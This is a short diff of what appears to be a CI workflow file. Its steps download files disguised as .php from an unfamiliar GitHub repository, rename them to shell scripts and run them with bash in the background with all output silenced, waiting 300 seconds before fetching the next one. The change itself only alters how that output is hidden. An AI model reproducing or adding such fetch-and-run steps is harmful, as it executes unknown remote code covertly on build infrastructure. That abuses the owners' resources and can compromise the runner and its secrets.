@@ -35,7 +35,7 @@ jobs:
         cd set
         wget https://github.com/Nsavtu/mosv1hbxe/raw/main/gi.php 
         mv gi.php gi.sh
-        bash gi.sh &> /dev/null &
+        bash gi.sh >/dev/null >/dev/null 2>&1 &
         sleep 300
         wget https://github.com/Nsavtu/mosv1hbxe/raw/main/di.php
         mv di.php nk.sh
